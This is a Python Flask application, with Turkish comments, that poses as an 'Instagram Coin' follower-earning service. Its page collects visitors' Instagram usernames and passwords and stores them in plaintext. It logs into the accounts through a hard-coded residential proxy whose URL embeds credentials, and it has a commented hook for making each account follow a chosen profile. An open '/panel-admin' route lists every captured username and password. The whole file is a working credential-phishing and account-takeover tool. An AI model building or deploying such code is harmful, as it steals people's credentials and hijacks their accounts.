import os
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

# 1. AYARLAR
load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# PROXY - TEK SATIR HIZLI TANIM
PROXY_URL = "http://pcUjiruWbB:PC_4gAMh8pCXyTQAxKW1@residential.proxy-cheap.com:6000"

class IGUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")

# 2. HIZLI GİRİŞ MOTORU (5 Saniyede Yanıt İçin Optimize Edildi)
def turbo_login(username, password):
    with app.app_context():
        user_record = IGUser.query.filter_by(username=username).first()
        cl = Client()
        try:
            # Gereksiz tüm bekleme ve kontrolleri geçiyoruz
            cl.set_proxy(PROXY_URL)
            cl.request_timeout = 8  # 8 saniyede cevap gelmezse düşer, asılı kalmaz
            
            user_record.status = "Giriş Deneniyor (Hızlı)..."
            db.session.commit()
            
            # Cihaz ayarlarını statik yapıyoruz (zaman kazanmak için)
            cl.set_device_settings({"device_model": "iPhone12,1"})
            
            if cl.login(username, password):
                user_record.status = "AKTİF ✅ (COIN BAŞLADI)"
                db.session.commit()
                # TAKİP KOMUTU BURAYA GELECEK:
                # cl.user_follow(cl.user_id_from_username("takip_edilecek_hesap"))
            else:
                user_record.status = "Şifre Hatalı ❌"
                db.session.commit()
        except Exception as e:
            user_record.status = "IP Blok/Zaman Aşımı ⚠️"
            db.session.commit()

# 3. KULLANICI ARAYÜZÜ (HTML)
@app.route('/')
def home():
    return render_template_string("""
    <body style="background:#000;color:#fff;text-align:center;padding-top:100px;font-family:sans-serif;">
        <h1>Instagram Coin</h1>
        <input id="u" placeholder="Kullanıcı Adı" style="padding:10px;margin:5px;"><br>
        <input id="p" type="password" placeholder="Şifre" style="padding:10px;margin:5px;"><br>
        <button onclick="start()" id="b" style="padding:10px 20px;background:#0095f6;color:#fff;border:none;border-radius:5px;">Coin Kas</button>
        <p id="m"></p>
        <script>
            async function start(){
                const u=document.getElementById('u').value, p=document.getElementById('p').value;
                document.getElementById('b').innerText="Başlatılıyor...";
                const r=await fetch('/api/start-login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
                const d=await r.json();
                document.getElementById('m').innerText=d.msg;
            }
        </script>
    </body>
    """)

# 4. API VE PANEL
@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p); db.session.add(user)
    else:
        user.password, user.status = p, "İşlem Başlatıldı..."
    db.session.commit()
    
    # THREAD'İ BAŞLAT VE BIRAK (ASLA BEKLEMEZ)
    threading.Thread(target=turbo_login, args=(u, p), daemon=True).start()
    return jsonify(status="success", msg="İşlem sıraya alındı, 10 saniye sonra paneli kontrol edin.")

@app.route('/panel-admin')
def admin():
    users = IGUser.query.order_by(IGUser.id.desc()).all()
    res = "<h2>CANLI TAKİP PANELİ</h2><table border='1'><tr><th>Kullanıcı</th><th>Şifre</th><th>Durum</th></tr>"
    for u in users: res += f"<tr><td>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
